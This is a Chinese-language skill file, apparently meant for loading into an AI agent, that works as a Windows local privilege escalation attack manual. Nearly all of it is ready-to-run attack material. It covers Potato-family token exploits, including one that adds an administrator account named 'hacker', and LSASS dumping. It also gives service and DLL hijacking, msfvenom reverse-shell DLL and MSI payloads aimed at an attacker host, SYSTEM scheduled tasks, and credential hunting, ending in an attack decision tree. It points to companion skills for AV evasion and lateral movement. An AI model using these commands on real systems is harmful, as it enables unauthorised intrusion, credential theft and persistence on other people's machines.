# 技能：Windows 本地权限提升 — 专家攻击手册

> **AI 加载指令**：专家级 Windows 权限提升技术。涵盖令牌操作、Potato 家族、服务配置错误、DLL 劫持、AlwaysInstallElevated、计划任务滥用、注册表自动运行和命名管道模拟。基础模型会遗漏细微的权限前提条件和特定操作系统版本的约束。

## 0. 相关路由

深入学习前，请考虑加载：

- [windows-lateral-movement](../windows-lateral-movement/SKILL.md) 提升权限后用于跳转到其他主机
- [windows-av-evasion](../windows-av-evasion/SKILL.md) 当 AV/EDR 阻止你的权限提升工具时
- [active-directory-kerberos-attacks](../active-directory-kerberos-attacks/SKILL.md) 当主机加入域且需要 AD 级别提升时
- [active-directory-acl-abuse](../active-directory-acl-abuse/SKILL.md) 通过 ACL 配置错误进行域权限提升

### 高级参考

当你需要时，请加载：

- [TOKEN_POTATO_TRICKS.md](./TOKEN_POTATO_TRICKS.md)
  - Potato 家族详细比较（JuicyPotato → GodPotato 进化）
  - 特定操作系统版本的漏洞选择
  - 每个变体的所需权限和协议细节

- [UAC_BYPASS_METHODS.md](./UAC_BYPASS_METHODS.md)
  - UAC 绕过技术矩阵（fodhelper、eventvwr、sdclt 等）
  - 自动提升二进制文件滥用
  - 模拟可信目录技巧

---

## 1. 列表检查

### 系统上下文

```cmd
whoami /all                        & REM 当前用户、组、权限
systeminfo                         & REM 操作系统版本、补丁、架构
hostname                           & REM 机器名称
net user %USERNAME%                & REM 组成员资格
```

### 令牌权限（关键）

```cmd
whoami /priv
```

| 权限 | 提升路径 |
|---|---|
| `SeImpersonatePrivilege` | Potato 家族漏洞（§2） |
| `SeAssignPrimaryTokenPrivilege` | 令牌操作、Potato 变体 |
| `SeDebugPrivilege` | 倾倒 LSASS、注入到 SYSTEM 进程 |
| `SeBackupPrivilege` | 读取任何文件（SAM/SYSTEM/NTDS.dit） |
| `SeRestorePrivilege` | 写入任何文件（DLL 劫持、服务二进制文件） |
| `SeTakeOwnershipPrivilege` | 拥有任何对象 |
| `SeLoadDriverPrivilege` | 加载易受攻击的内核驱动程序 → 内核漏洞 |

### 服务和计划任务

```cmd
sc query state= all                & REM 所有服务
wmic service get name,displayname,pathname,startmode | findstr /i "auto"
schtasks /query /fo LIST /v        & REM 详细计划任务列表
```

### 已安装软件和补丁

```cmd
wmic product get name,version
wmic qfe list                      & REM 已安装补丁
```

### 网络 & 凭据

```cmd
netstat -ano                       & REM 监听端口 + PID
cmdkey /list                       & REM 存储的凭据
dir C:\Users\*\AppData\Local\Microsoft\Credentials\*
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul
```

---

## 2. 令牌操作 & Potato 漏洞

### SeImpersonatePrivilege 滥用

服务账户（IIS AppPool、MSSQL 等）通常持有 `SeImpersonatePrivilege`。这使你能够模拟任何提交给你的令牌。

| 工具 | 操作系统支持 | 协议 | 备注 |
|---|---|---|---|
| **JuicyPotato** | Win7–Server2016 | COM/DCOM | 需要有效 CLSID；在 Server2019+ 上被修补 |
| **RoguePotato** | Server2019+ | OXID 解析器重定向 | 需要在端口 135 上受控的机器 |
| **PrintSpoofer** | Win10/Server2016-2019 | 通过打印池器的命名管道 | 简单、快速；打印池器必须运行 |
| **SweetPotato** | 广泛支持 | COM + 打印 + EFS | 结合多种技术 |
| **GodPotato** | Win8–Server2022 | DCOM RPCSS | 在最新修补系统上工作 |

```cmd
# PrintSpoofer (现代系统最简单)
PrintSpoofer64.exe -i -c "cmd /c whoami"

# GodPotato (最广泛的兼容性)
GodPotato.exe -cmd "cmd /c net user hacker P@ss123 /add && net localgroup administrators hacker /add"

# JuicyPotato (旧系统)
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c whoami" -t * -c {CLSID}
```

### SeDebugPrivilege 滥用

```powershell
# 如果启用了 SeDebugPrivilege，则倾倒 LSASS
procdump -ma lsass.exe lsass.dmp

# 或者迁移到 SYSTEM 进程
# Meterpreter: 迁移到 winlogon.exe / services.exe
```

---

## 3. 服务配置错误

### 未加引号的路径

```cmd
# 查找带空格的未加引号路径
wmic service get name,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v """
```

如果路径是 `C:\Program Files\My App\service.exe`，Windows 会尝试：

1. `C:\Program.exe`
2. `C:\Program Files\My.exe`
3. `C:\Program Files\My App\service.exe`

将恶意二进制文件放置在第一个可写位置。

### 弱服务权限

```cmd
# 使用 accesschk (Sysinternals) 检查服务 ACL
accesschk64.exe -wuvc * /accepteula
# 查看：SERVICE_CHANGE_CONFIG、SERVICE_ALL_ACCESS
```

```cmd
# 重新配置服务以运行攻击者二进制文件
sc config vuln_svc binpath= "C:\temp\rev.exe"
sc stop vuln_svc
sc start vuln_svc
```

### 可写服务二进制文件

```cmd
# 检查当前用户是否可以写入服务二进制文件路径
icacls "C:\Program Files\VulnApp\service.exe"
# (F) = 完整、(M) = 修改、(W) = 写入 → 替换二进制文件
```

---

## 4. DLL 劫持

### DLL 搜索顺序（标准）

1. 可执行文件的目录
2. `C:\Windows\System32`
3. `C:\Windows\System`
4. `C:\Windows`
5. 当前目录
6. `%PATH%` 中的目录

### 利用

```cmd
# 使用 Process Monitor 查找缺失的 DLL
# 过滤：Result=NAME NOT FOUND, Path ends with .dll

# 编译恶意 DLL
# msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f dll > evil.dll

# 放置在可写目录中，该目录位于真实 DLL 位置之前
```

### 已知的 Phantom DLL 目标

| 应用程序 | 缺失的 DLL | 放置位置 |
|---|---|---|
| 各种 .NET 应用程序 | `profapi.dll` | 应用程序目录 |
| Windows 服务 | `wlbsctrl.dll` | `%PATH%` 可写目录 |
| 第三方更新器 | `VERSION.dll` | 应用程序目录 |

---

## 5. AlwaysInstallElevated

```cmd
# 检查两个注册表键 — 两者都必须设置为 1
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

```cmd
# 生成 MSI 有效负载
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f msi > evil.msi
msiexec /quiet /qn /i evil.msi
```

---

## 6. 计划任务滥用

```cmd
# 列出可写脚本或缺失二进制的任务
schtasks /query /fo LIST /v | findstr /i "Task To Run\|Run As User\|Schedule Type"

# 检查任务二进制文件的权限
icacls "C:\path\to\task\binary.exe"

# 如果可写：替换二进制文件，等待任务执行
# 如果缺失：将你的二进制文件放置在预期路径
```

### 通过 PowerShell 创建计划任务

```powershell
# 如果你能够创建任务（从低权限不太可能，但在绕过 UAC 后有用）
$action = New-ScheduledTaskAction -Execute "C:\temp\rev.exe"
$trigger = New-ScheduledTaskTrigger -AtLogon
Register-ScheduledTask -TaskName "Updater" -Action $action -Trigger $trigger -User "SYSTEM"
```

---

## 7. 注册表自动运行

```cmd
# 检查可写的自动运行位置
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce

# 使用 accesschk 检查权限
accesschk64.exe -wvu "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /accepteula
```

如果自动运行条目指向可写路径 → 替换二进制文件或注入新条目。

---

## 8. 命名管道模拟

```powershell
# 服务账户创建命名管道，欺骗 SYSTEM 进程连接
# 连接的客户端的令牌将被模拟

# PrintSpoofer 利用此技术与打印池器：
PrintSpoofer64.exe -i -c powershell.exe
```

自定义命名管道服务器（需要 SeImpersonatePrivilege）：
```powershell
# 创建管道 → 强迫 SYSTEM 连接 → ImpersonateNamedPipeClient() → SYSTEM 令牌
```

---

## 9. 自动化工具

| 工具 | 目的 | 命令 |
|---|---|---|
| **winPEAS** | 全面 Windows 列表检查 | `winPEASx64.exe` |
| **PowerUp** | 服务/DLL/注册表配置错误检查 | `Invoke-AllChecks` |
| **Seatbelt** | 安全性为主的主机调查 | `Seatbelt.exe -group=all` |
| **SharpUp** | C# 版本的 PowerUp 检查 | `SharpUp.exe audit` |
| **PrivescCheck** | PowerShell 权限提升检查器 | `Invoke-PrivescCheck` |
| **BeRoot** | 常见配置错误查找器 | `beRoot.exe` |

---

## 10. 权限提升决策树

```
Windows 低权限 shell
│
├── whoami /priv → SeImpersonatePrivilege?
│   ├── 是 → Potato 家族 (§2)
│   │   ├── Server2019+/Win11 → GodPotato 或 PrintSpoofer
│   │   ├── Server2016/Win10 → PrintSpoofer 或 SweetPotato
│   │   └── 更旧 → JuicyPotato (需要 CLSID)
│   └── SeDebugPrivilege? → LSASS 倾倒 / 进程注入
│
├── 服务配置错误?
│   ├── 带空格的未加引号路径 + 可写目录? → 二进制文件植入 (§3)
│   ├── SERVICE_CHANGE_CONFIG 在服务上? → 重新配置 binpath (§3)
│   └── 可写服务二进制文件? → 替换可执行文件 (§3)
│
├── DLL 劫持机会?
│   ├── 搜索路径中缺失的 DLL? → 植入恶意 DLL (§4)
│   └── %PATH% 中可写目录? → DLL 植入 (§4)
│
├── AlwaysInstallElevated 设置?
│   └── HKLM+HKCU = 1 → MSI 有效负载 (§5)
│
├── 计划任务滥用?
│   ├── 以 SYSTEM 身份运行且可写二进制的任务? → 替换 (§6)
│   └── 任务引用缺失的二进制文件? → 植入二进制文件 (§6)
│
├── 注册表自动运行可写?
│   └── 可写二进制路径 → 下次登录/重启时替换
│
├── 需要绕过 UAC? (中等完整性 → 高完整性)
│   └── 加载 UAC_BYPASS_METHODS.md
│
├── 存储的凭据?
│   ├── cmdkey /list → runas /savecred
│   ├── 注册表中的自动登录? → 明文凭据
│   └── WiFi 密码、浏览器凭据、DPAPI
│
└── 以上都不适用?
    ├── 运行 winPEAS 进行全面扫描
    ├── 检查内部服务 (netstat -ano)
    ├── 查找敏感文件 (unattend.xml、web.config、*.config)
    └── 检查内核漏洞 (systeminfo → Windows Exploit Suggester)
```
